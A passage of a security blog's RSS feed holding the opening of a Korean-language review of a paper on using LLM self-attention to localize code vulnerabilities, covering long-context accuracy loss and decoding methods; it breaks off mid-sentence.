      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM/">LLM</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Security/">LLM Security</category>
      
      <category domain="https://hackyboiz.github.io/tags/LLM-Safety/">LLM Safety</category>
      
      <category domain="https://hackyboiz.github.io/tags/Transformer/">Transformer</category>
      
      <category domain="https://hackyboiz.github.io/tags/Attention/">Attention</category>
      
      <category domain="https://hackyboiz.github.io/tags/Automated-vulnerability-Detection/">Automated vulnerability Detection</category>
      
      
      <comments>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] LLM Security &amp; Safety Part 3. “Attention Is All You Need for LLM-based Code Vulnerability Localization” Review (KR)</title>
      <link>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/kr/</link>
      <guid>https://hackyboiz.github.io/2025/08/11/j0ker/llm_part3/kr/</guid>
      <pubDate>Mon, 11 Aug 2025 08:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;1-&amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;a href=&quot;#1-&amp;#xC11C;&amp;#xB860;&quot; class=&quot;headerlink&quot; title=&quot;1. &amp;#xC11C;&amp;#xB860;&quot;&gt;&lt;/a&gt;1. &amp;#xC11C;&amp;#xB860;&lt;/h1&gt;&lt;p&gt;&amp;#xC</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="1-&#xC11C;&#xB860;"><a href="#1-&#xC11C;&#xB860;" class="headerlink" title="1. &#xC11C;&#xB860;"></a>1. &#xC11C;&#xB860;</h1><p>&#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xB610; &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;&#xB85C; &#xB3CC;&#xC544;&#xC628; j0ker&#xC785;&#xB2C8;&#xB2E4;! &#xC6D0;&#xB798; &#xD300;&#xC5D0;&#xB294; &#x201C;&#xC774;&#xBC88; Usenix &#xB17C;&#xBB38;&#xB4E4; &#xC804;&#xCCB4;&#xB97C; LLM&#xC73C;&#xB85C; &#xBD84;&#xC11D;&#xD574;&#xC11C; &#xD2B8;&#xB79C;&#xB4DC; &#xBD84;&#xC11D;&#xC744; &#xD574;&#xBCFC;&#xAC70;&#xC57C;!&#x201D;&#xB77C;&#xACE0; &#xD588;&#xC9C0;&#xB9CC;&#x2026; &#xB124;&#x2026; &#xC5B4;&#xB9BC;&#xB3C4; &#xC5C6;&#xC5C8;&#xC8E0;? &#xC5ED;&#xC2DC; &#xD604;&#xC0DD;&#xC740; &#xB9CC;&#xB9CC;&#xCE58; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/1.jpg" alt="index_img"></p><blockquote><p>&#xB178;&#xC608;&#xB294;&#x2026;. &#xC5B8;&#xC81C;&#xCBE4; &#xD589;&#xBCF5;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#x2026;?</p></blockquote><p>&#xADF8;&#xB798;&#xC11C; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xB17C;&#xBB38; &#xD55C;&#xD3B8;&#xC744; &#xAC00;&#xC838;&#xC640; &#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC800;&#xBC88; &#xB17C;&#xBB38;&#xC740; &#x201C;&#xC544; &#xB204;&#xAD6C;&#xB098; &#xC0DD;&#xAC01;&#xD560; &#xBC95;&#xD55C;&#xAC78; &#xD588;&#xB124;&#x201D;&#xB77C;&#xACE0; &#xC0DD;&#xAC01;&#xC774; &#xB4E4;&#xC5C8;&#xB2E4;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB294; &#x201C;&#xC624; &#xC598;&#xB294; &#xC880; &#xB2E4;&#xB974;&#xAD70;&#x201D;&#xC774;&#xB77C;&#xB294; &#xC0DD;&#xAC01;&#xC774; &#xBC14;&#xB85C; &#xB4E4;&#xC5C8;&#xB358; &#xB17C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB978; &#xB17C;&#xBB38;&#xB4E4;&#xC740; &#xD504;&#xB86C;&#xD504;&#xD305;, RAG &#xB4F1;&#xC744; &#xD1B5;&#xD574; LLM&#xC758; &#xCD94;&#xB860; &#xC544;&#xC6C3;&#xD48B;&#xC5D0; &#xC9D1;&#xC911;&#xD588;&#xB2E4;&#xBA74; &#xC774; &#xB17C;&#xBB38;&#xC740; LLM&#xC758; &#xAD6C;&#xC870; &#xC790;&#xCCB4;&#xB97C; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; &#xB208;&#xC5D0; &#xB744;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xBC14;&#xB85C; 2024&#xB144; 10&#xC6D4;&#xC5D0; Arxiv&#xC5D0; &#xACF5;&#xAC1C;&#xB41C; &#x201C;<a href="https://arxiv.org/html/2410.15288v1">Attention Is All You Need for LLM-based Code Vulnerability Localization</a>&#x201D; &#xC785;&#xB2C8;&#xB2E4;. &#xB530;&#xB85C; &#xC5B4;&#xB290; &#xD559;&#xD68C;&#xC5D0; &#xD22C;&#xACE0;&#xD558;&#xC9C0;&#xB294; &#xC54A;&#xACE0; &#xC544;&#xCE74;&#xC774;&#xBE0C;&#xC5D0;&#xB9CC; &#xC62C;&#xB9B0;&#xAC83; &#xAC19;&#xC740;&#xB370;&#xC694;. &#xC544;&#xC774;&#xB514;&#xC5B4; &#xC790;&#xCCB4;&#xB294; &#xAD1C;&#xCC2E;&#xC9C0;&#xB9CC; &#xC544;&#xB9C8; &#xACB0;&#xB860; &#xBD80;&#xBD84;&#xC774; &#xC880; &#xC544;&#xC27D;&#xC9C0; &#xC54A;&#xB098; &#xC2F6;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="2-&#xB17C;&#xBB38;-&#xB9AC;&#xBDF0;"><a href="#2-&#xB17C;&#xBB38;-&#xB9AC;&#xBDF0;" class="headerlink" title="2. &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;"></a>2. &#xB17C;&#xBB38; &#xB9AC;&#xBDF0;</h1><p>&#x201C;Attention Is All You Need for LLM-based Code Vulnerability Localization&#x201D;&#xB77C;&#xB294; &#xC774;&#xB984;&#xC5D0;&#xC11C; &#xC54C; &#xC218; &#xC788;&#xB2E4;&#xC2DC;&#xD53C; &#xC774; &#xB17C;&#xBB38;&#xC5D0;&#xC11C;&#xB294; LLM&#xC758; self-attention &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xCDE8;&#xC57D;&#xC810; &#xC704;&#xCE58;&#xB97C; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC774; &#xC8FC;&#xC694; &#xACE8;&#xC790;&#xC785;&#xB2C8;&#xB2E4;. &#x201C;<a href="https://arxiv.org/abs/1706.03762">Attention Is All You Need</a>&#x201D;&#xB77C;&#xB294; &#xD604;&#xC7AC; LLM&#xC758; &#xAE30;&#xBC18;&#xC774; &#xB418;&#xB294; &#xB17C;&#xBB38;&#xC744; &#xC624;&#xB9C8;&#xC8FC;&#xD588;&#xB2E4;&#xB294; &#xAC83;&#xB3C4; &#xB9E4;&#xC6B0; &#xC7AC;&#xBBF8;&#xC788;&#xB294; &#xD3EC;&#xC778;&#xD2B8;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;</p><h2 id="2-1-&#xAE30;&#xC874;-&#xBC29;&#xBC95;&#xB4E4;&#xC758;-&#xD55C;&#xACC4;"><a href="#2-1-&#xAE30;&#xC874;-&#xBC29;&#xBC95;&#xB4E4;&#xC758;-&#xD55C;&#xACC4;" class="headerlink" title="2.1 &#xAE30;&#xC874; &#xBC29;&#xBC95;&#xB4E4;&#xC758; &#xD55C;&#xACC4;"></a>2.1 &#xAE30;&#xC874; &#xBC29;&#xBC95;&#xB4E4;&#xC758; &#xD55C;&#xACC4;</h2><h3 id="1-Lost-in-the-Middle"><a href="#1-Lost-in-the-Middle" class="headerlink" title="1) Lost in the Middle"></a>1) Lost in the Middle</h3><p>&#xBCF8;&#xACA9;&#xC801;&#xC73C;&#xB85C; &#xB0B4;&#xC6A9;&#xC5D0; &#xB4E4;&#xC5B4;&#xAC00;&#xAE30; &#xC804;, &#xB17C;&#xBB38;&#xC5D0;&#xC11C; &#xC9C0;&#xC801;&#xD558;&#xB294; LLM&#xC774; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC9C0;&#xC5D0;&#xC11C; &#xAC00;&#xC9C0;&#xB294; &#xAC00;&#xC7A5; &#xD070; &#xD55C;&#xACC4;&#xC810;&#xC740; &#x201C;&#xAE34; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;&#xC5D0;&#xC11C;&#xC758; &#xCD94;&#xB860; &#xC815;&#xD655;&#xB3C4; &#xAC10;&#xC18C;&#x201D;&#xC785;&#xB2C8;&#xB2E4;. &#xCF54;&#xB4DC;&#xAC00; 300&#xC904;&#xC774; &#xB118;&#xC5B4;&#xAC00;&#xAE30; &#xC2DC;&#xC791;&#xD558;&#xBA74; &#xC815;&#xD655;&#xB3C4;&#xB294; 5% &#xBBF8;&#xB9CC;&#xC73C;&#xB85C; &#xB0B4;&#xB824;&#xAC04;&#xB2E4;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2025/08/11/j0ker/llm_part3/kr/2.png" alt="index_img"></p><p>&#xB610;&#xD55C; &#xADFC;&#xAC70;&#xB85C; &#xC81C;&#xC2DC;&#xD55C; &#xB17C;&#xBB38;&#xB4E4;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://arxiv.org/pdf/2307.03172">Lost in the Middle: How Language Models Use Long Contexs</a></li><li><a href="https://arxiv.org/pdf/2406.10149">BABILong: Testing the Limits of LLMs with Long Context Reasoning-in-a-Haystack</a></li></ul><p>&#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xB4E4; &#xC774; &#xAE00;&#xC744; &#xC77D;&#xC73C;&#xBA74;&#xC11C; &#xB610; &#xB17C;&#xBB38;&#xC744; &#xC77D;&#xACE0; &#xC2F6;&#xC9C0;&#xB294; &#xC54A;&#xC73C;&#xC2DC;&#xACA0;&#xC8E0;? &#xD55C; &#xC720;&#xD29C;&#xBE0C; &#xCC44;&#xB110;&#xC5D0;&#xC11C; &#xC720;&#xC0AC;&#xD55C; &#xC8FC;&#xC81C;&#xB97C; &#xB2E4;&#xB8EC; &#xC601;&#xC0C1;&#xC774; &#xC788;&#xC5B4; &#xC774;&#xAC78; &#xBCF4;&#xC154;&#xB3C4; &#xC88B;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://www.youtube.com/watch?v=EbN_DWM3DJc">OpenAI, &#xAD6C;&#xAE00;, &#xD074;&#xB85C;&#xB4DC; &#xB2E4; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#x2026; &#xC785;&#xB825; &#xAE38;&#xC774; &#xAE38;&#xC5B4;&#xC9C0;&#xBA74; &#xC0DD;&#xAC01;&#xBCF4;&#xB2E4; &#xD6E8;&#xC52C; &#xB354; &#xC131;&#xB2A5; &#xB5A8;&#xC5B4;&#xC9C4;&#xB2E4; - &#xC5B4;&#xB5BB;&#xAC8C; &#xB300;&#xC751;&#xD574;&#xC57C; &#xD558;&#xB098; | &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC5D4;&#xC9C0;&#xB2C8;&#xC5B4;&#xB9C1;</a></li></ul><p>&#xC704; &#xB0B4;&#xC6A9;&#xB4E4;&#xC744; &#xC790;&#xC138;&#xD788; &#xC77D;&#xC5B4;&#xBCF4;&#xC9C0;&#xB294; &#xC54A;&#xC558;&#xC9C0;&#xB9CC; &#xD575;&#xC2EC; &#xB0B4;&#xC6A9;&#xACFC; &#xAD00;&#xB828;&#xC5C6;&#xB294; &#xD1A0;&#xD070;&#xC774; &#xB9CE;&#xC544;&#xC9D0;&#xC5D0; &#xB530;&#xB77C; &#xC5B4;&#xD150;&#xC158;&#xD574;&#xC57C; &#xD560; &#xB0B4;&#xC6A9;&#xB4E4;&#xC5D0; &#xC815;&#xD655;&#xD788; &#xC5B4;&#xD150;&#xC158;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xAC70;&#xB098; &#xD558;&#xB294; &#xB4F1;&#xC758; &#xBB38;&#xC81C;&#xC77C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xC774; &#xBB38;&#xC81C;&#xB294; LLM &#xC11C;&#xBE44;&#xC2A4;&#xB4E4;&#xC744; &#xB9CE;&#xC774; &#xC368;&#xBCF4;&#xC2DC;&#xACE0;, &#xD2B9;&#xD788; &#xCDE8;&#xC57D;&#xC810; &#xD0D0;&#xC0C9;&#xC744; &#xC704;&#xD574; &#xAE34; &#xCF54;&#xB4DC;&#xB4E4;&#xC744; &#xB123;&#xC5B4;&#xBCF4;&#xC2E0; &#xBD84;&#xB4E4;&#xC774;&#xB77C;&#xBA74; &#xB2E4;&#xB4E4; &#xD55C; &#xBC88;&#xC529;&#xC740; &#xACAA;&#xC5B4;&#xBCF4;&#xC168;&#xC744; &#xBB38;&#xC81C;&#xC77C; &#xAC81;&#xB2C8;&#xB2E4;. &#xC5EC;&#xB7EC; &#xD568;&#xC218;&#xC5D0; &#xAC78;&#xCCD0; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544;&#xB2EC;&#xB77C;&#xACE0; &#xD558;&#xBA74; &#xCF54;&#xB4DC;&#xB97C; &#xAE4C;&#xBA39;&#xAC70;&#xB098; &#xAE30;&#xC5B5;&#xC744; &#xBABB;&#xD55C;&#xB2E4;&#xAC70;&#xB098; &#xD558;&#xB294; &#xBB38;&#xC81C;&#xB4E4;&#xC774; &#xBC1C;&#xC0DD;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB7EC;&#xD55C; &#xBB38;&#xC81C;&#xB4E4;&#xC740; (&#xCCB4;&#xAC10;&#xC801;&#xC73C;&#xB85C;)&#xC791;&#xB144; &#xB9D0; ~ &#xC62C;&#xD574; &#xCD08;&#xBD80;&#xD130; &#xB9CE;&#xC774; &#xB098;&#xC544;&#xC9C0;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xAC83;&#xC744; &#xB290;&#xB07C;&#xAE30;&#xB3C4; &#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xC774;&#xB7F0; &#xBB38;&#xC81C;&#xB4E4;&#xC744; &#xAC1C;&#xC120;&#xD560; &#xC218; &#xC788;&#xB294; &#xB17C;&#xBB38;&#xB4E4;&#xB3C4; &#xB098;&#xC624;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>(&#xC5EC;&#xAE30;&#xB294; LLM&#xC774; &#xCC3E;&#xC544;&#xC900; &#xC815;&#xBCF4;&#xC785;&#xB2C8;&#xB2E4; &#x314B;&#x314B;)</p><ol><li>&#xC704;&#xCE58;&#xC5D0; &#xC0C1;&#xAD00;&#xC5C6;&#xC774; &#xC815;&#xBCF4;&#xB97C; &#xCC3E;&#xB294; &#xD6C8;&#xB828; &#xBC29;&#xC2DD;<ul><li><strong>&#x201C;Never Lost in the Middle: Mastering Long-Context Question Answering with Position-Agnostic Decompositional Training&#x201D; (2024)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; <strong>&#x2018;&#xC704;&#xCE58;&#xC5D0; &#xAD6C;&#xC560;&#xBC1B;&#xC9C0; &#xC54A;&#xB294; &#xBD84;&#xD574; &#xD6C8;&#xB828;(Position-Agnostic Decompositional Training)&#x2019;</strong> &#xC774;&#xB77C;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xD6C8;&#xB828; &#xBC29;&#xBC95;&#xC744; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;. &#xAE34; &#xC9C8;&#xBB38;&#xC744; &#xC5EC;&#xB7EC; &#xB2E8;&#xACC4;&#xC758; &#xC9E7;&#xC740; &#xC9C8;&#xBB38;&#xC73C;&#xB85C; &#xBD84;&#xD574;&#xD558;&#xACE0;, &#xC815;&#xB2F5;&#xC758; &#xC704;&#xCE58;&#xB97C; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xC591;&#xD558;&#xAC8C; &#xC11E;&#xC5B4;&#xC11C; &#xBAA8;&#xB378;&#xC744; &#xD6C8;&#xB828;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> &#xBAA8;&#xB378;&#xC774; &#xC815;&#xBCF4;&#xC758; &#x2018;&#xC704;&#xCE58;&#x2019;&#xC5D0; &#xC758;&#xC874;&#xD558;&#xB294; &#xD3B8;&#xD5A5;&#xC744; &#xC904;&#xC774;&#xACE0;, &#xBB38;&#xB9E5; &#xC5B4;&#xB514;&#xC5D0; &#xC788;&#xB4E0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB97C; &#xCC3E;&#xC544;&#xB0B4;&#xB294; &#xB2A5;&#xB825;&#xC744; &#xAC15;&#xD654;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li>&#xC785;&#xB825; &#xB370;&#xC774;&#xD130;&#xC758; &#xAD6C;&#xC870; &#xBCC0;&#xACBD;<ul><li><strong>&#x201C;Structured Packing in LLM Training Improves Long Context Utilization&#x201D; (2023)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xC5EC;&#xB7EC; &#xBB38;&#xC11C;&#xB97C; &#xB2E8;&#xC21C;&#xD788; &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC774;&#xC5B4; &#xBD99;&#xC5EC; &#xD6C8;&#xB828;&#xC2DC;&#xD0A4;&#xB294; &#xB300;&#xC2E0;, &#xAD00;&#xB828; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xC870;&#xC801;&#xC73C;&#xB85C; &#xBB36;&#xC5B4;&#xC11C;(packing) &#xBAA8;&#xB378;&#xC5D0; &#xC81C;&#xACF5;&#xD558;&#xB294; &#xBC29;&#xC2DD;&#xC744; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> &#xC815;&#xBCF4;&#xC758; &#xB17C;&#xB9AC;&#xC801; &#xC5F0;&#xACB0;&#xC131;&#xC744; &#xAC15;&#xD654;&#xD558;&#xC5EC; &#xBAA8;&#xB378;&#xC774; &#xBB38;&#xB9E5; &#xC911;&#xAC04;&#xC5D0; &#xC788;&#xB294; &#xC815;&#xBCF4;&#xB77C;&#xB3C4; &#xADF8; &#xC911;&#xC694;&#xC131;&#xC744; &#xB354; &#xC798; &#xD30C;&#xC545;&#xD558;&#xACE0; &#xD65C;&#xC6A9;&#xD558;&#xB3C4;&#xB85D; &#xB3D5;&#xC2B5;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li>&#xC5B4;&#xD150;&#xC158; &#xBA54;&#xCEE4;&#xB2C8;&#xC998; &#xAC1C;&#xC120;<ul><li><strong>&#x201C;Mixture-of-Recursions: Learning Dynamic Recursive Depths for Adaptive Token-Level Computation&#x201D; (2025)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xBAA8;&#xB4E0; &#xD1A0;&#xD070;&#xC744; &#xB3D9;&#xC77C;&#xD558;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xB300;&#xC2E0; &#x2018;&#xB77C;&#xC6B0;&#xD130;&#x2019;&#xB97C; &#xD1B5;&#xD574; &#xC911;&#xC694;&#xD55C; &#xD1A0;&#xD070;&#xC744; &#xC2DD;&#xBCC4;&#xD558;&#xACE0;, &#xD574;&#xB2F9; &#xD1A0;&#xD070;&#xC5D0; &#xB354; &#xB9CE;&#xC740; &#xC5F0;&#xC0B0;&#xC744; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xD560;&#xB2F9;&#xD558;&#xB294; <strong>MoR(Mixture-of-Recursions)</strong> &#xC544;&#xD0A4;&#xD14D;&#xCC98;&#xB97C; &#xC81C;&#xC548;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> &#xC815;&#xBCF4;&#xC758; &#xC704;&#xCE58;&#xAC00; &#xC544;&#xB2CC; &#xC911;&#xC694;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xCEF4;&#xD4E8;&#xD305; &#xC790;&#xC6D0;&#xC744; &#xC9D1;&#xC911;&#xD558;&#xC5EC;, &#xBB38;&#xB9E5; &#xC911;&#xAC04;&#xC5D0; &#xC788;&#xB294; &#xD575;&#xC2EC; &#xC815;&#xBCF4;&#xB3C4; &#xB193;&#xCE58;&#xC9C0; &#xC54A;&#xACE0; &#xAE4A;&#xC774; &#xC788;&#xAC8C; &#xCC98;&#xB9AC;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li><li>&#xAC80;&#xC0C9; &#xC99D;&#xAC15; &#xC0DD;&#xC131;(RAG)&#xACFC;&#xC758; &#xACB0;&#xD569; &#xBC0F; &#xBE44;&#xAD50;<ul><li><strong>&#x201C;Long Context vs. RAG for LLMs: An Evaluation and Revisits&#x201D; (2025)</strong><ul><li><strong>&#xD575;&#xC2EC; &#xB0B4;&#xC6A9;:</strong> &#xAE34; &#xBB38;&#xB9E5;&#xC744; &#xD1B5;&#xC9F8;&#xB85C; &#xC785;&#xB825;&#xD558;&#xB294; &#xBC29;&#xC2DD;(Long Context)&#xACFC; &#xC678;&#xBD80; &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#xC5D0;&#xC11C; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC; &#xAC80;&#xC0C9;&#xD574;&#xC11C; &#xC81C;&#xACF5;&#xD558;&#xB294; RAG(Retrieval-Augmented Generation) &#xBC29;&#xC2DD;&#xC744; &#xBE44;&#xAD50; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;.</li><li><strong>&#xD574;&#xACB0; &#xBC29;&#xC2DD;:</strong> RAG&#xB294; &#xC560;&#xCD08;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC815;&#xBCF4;&#xB9CC; &#x2018;&#xAC80;&#xC0C9;&#x2019;&#xD574;&#xC11C; &#xBB38;&#xB9E5;&#xC758; &#xC55E;&#xBD80;&#xBD84;&#xC5D0; &#xC81C;&#xC2DC;&#xD558;&#xBBC0;&#xB85C;, &#x201C;Lost in the Middle&#x201D; &#xBB38;&#xC81C;&#xB97C; &#xC6D0;&#xCC9C;&#xC801;&#xC73C;&#xB85C; &#xD68C;&#xD53C;&#xD558;&#xB294; &#xD6A8;&#xACFC;&#xC801;&#xC778; &#xB300;&#xC548;&#xC774; &#xB420; &#xC218; &#xC788;&#xC74C;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;. &#xB2E4;&#xB9CC;, &#xC5B4;&#xB5A4; &#xBC29;&#xC2DD;&#xC774; &#xB354; &#xC6B0;&#xC6D4;&#xD55C;&#xC9C0;&#xB294; &#xD0DC;&#xC2A4;&#xD06C;&#xC758; &#xC885;&#xB958;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9C4;&#xB2E4;&#xACE0; &#xBD84;&#xC11D;&#xD569;&#xB2C8;&#xB2E4;.</li></ul></li></ul></li></ol><p>&#xC704; &#xB17C;&#xBB38;&#xB4E4;&#xC744; &#xBCF4;&#xBA74; &#xD6C8;&#xB828; &#xACFC;&#xC815;, &#xD6C8;&#xB828; &#xB370;&#xC774;&#xD130;&#xC14B;, &#xC5B4;&#xD150;&#xC158; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;, &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xBC29;&#xBA74;&#xC5D0;&#xC11C; &#xC774; &#xBB38;&#xC81C;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xC5F0;&#xAD6C;&#xB97C; &#xD558;&#xACE0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="2-&#xC815;&#xD655;&#xB3C4;"><a href="#2-&#xC815;&#xD655;&#xB3C4;" class="headerlink" title="2) &#xC815;&#xD655;&#xB3C4;"></a>2) &#xC815;&#xD655;&#xB3C4;</h3><p>LLM&#xC758; &#xADFC;&#xBCF8;&#xC801;&#xC778; &#xBB38;&#xC81C;&#xC810;&#xC778; &#xCD9C;&#xB825; &#xACB0;&#xACFC;&#xC758; &#xC815;&#xD655;&#xB3C4; &#xC785;&#xB2C8;&#xB2E4;. &#xBB3C;&#xB860; &#xCC98;&#xC74C; ChatGPT 3.5&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC744; &#xB54C;&#xBCF4;&#xB2E4;&#xB294; &#xD6E8;&#xC52C; &#xB098;&#xC544;&#xC84C;&#xC9C0;&#xB9CC; &#xC5EC;&#xC804;&#xD788; &#xC624;&#xD0D0;&#xACFC; &#xBBF8;&#xD0D0; &#xBB38;&#xC81C;&#xB294; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB97C; &#xD574;&#xACB0;&#xD558;&#xAE30; &#xC704;&#xD574; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xACE0;&#xAE09; reasoning &#xAE30;&#xBC95;&#xB4E4;&#xC774; &#xC0AC;&#xC6A9;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><a href="https://arxiv.org/pdf/2203.11171">SELF-CONSISTENCY IMPROVES CHAIN OF THOUGHT REASONING IN LANGUAGE MODELS</a></li><li><a href="https://arxiv.org/pdf/2408.06195">MUTUAL REASONING MAKES SMALLER LLMS STRONGER PROBLEM-SOLVERS</a></li></ul><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774;&#xB7F0; &#xACE0;&#xAE09; &#xD504;&#xB86C;&#xD504;&#xD305;, CoT &#xAE30;&#xBC95;&#xB4E4;&#xB3C4; &#xBAA8;&#xB450; stochastic decoding&#xC5D0; &#xC758;&#xC9C0;&#xD574; &#xC5EC;&#xB7EC; &#xCD9C;&#xB825;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xB2E4;&#xC218;&#xACB0; &#xD22C;&#xD45C;&#xB97C; &#xD558;&#xAC70;&#xB098; &#xC810;&#xC218;&#xB97C; &#xB9E4;&#xAE30;&#xB294; &#xB4F1; &#xBD88;&#xC644;&#xC804;&#xD55C; &#xBC29;&#xBC95;&#xC774;&#xB77C;&#xACE0; &#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>Stochastic decoding(&#xD655;&#xB960;&#xC801; &#xB514;&#xCF54;&#xB529;)&#xC740; LLM&#xC774; &#xD14D;&#xC2A4;&#xD2B8;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xB54C; &#xB2E4;&#xC74C; &#xD1A0;&#xD070;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xBC29;&#xC2DD; &#xC911; &#xD558;&#xB098;&#xB85C; &#xACC4;&#xC0B0;&#xB41C; &#xD655;&#xB960; &#xBD84;&#xD3EC;&#xC5D0;&#xC11C; &#xBB34;&#xC791;&#xC704;&#xB85C; &#xD1A0;&#xD070;&#xC744; &#xC0D8;&#xD50C;&#xB9C1;&#xD569;&#xB2C8;&#xB2E4;. &#xC989;, &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xD1A0;&#xD070;&#xC744; &#x2018;&#xD56D;&#xC0C1;&#x2019; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xAC01; &#xD1A0;&#xD070;&#xC758; &#xD655;&#xB960;&#xC5D0; &#xBE44;&#xB840;&#xD558;&#xC5EC; &#xC120;&#xD0DD;&#xB420; &#xAE30;&#xD68C;&#xB97C; &#xC8FC;&#xB294; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</li><li>&#xBC18;&#xB300;&#xB85C; Deterministic Decoding(&#xACB0;&#xC815;&#xB860;&#xC801; &#xB514;&#xCF54;&#xB529;)&#xC740; &#xB2E8;&#xC21C;&#xD788; &#xD655;&#xB960;&#xC774; &#xAC00;&#xC7A5; &#xB192;&#xC740; &#xD1A0;&#xD070;&#xC744; &#xC120;&#xD0DD;&#xD558;&#xB294; &#xAC83;&#xC73C;&#xB85C; &#xB9E4;&#xBC88; &#xB3D9;&#xC77C;&#xD55C; &#xC785;&#xB825;&#xC5D0; &#xB300;&#xD574; &#xB3D9;&#xC77C;&#xD55C; &#xCD9C;&#xB825;&#xC744; &#xBCF4;&#xC7A5;&#xD558;&#xC9C0;&#xB9CC;, &#xBC18;&#xBCF5;&#xC801;&#xC774;&#xACE0; 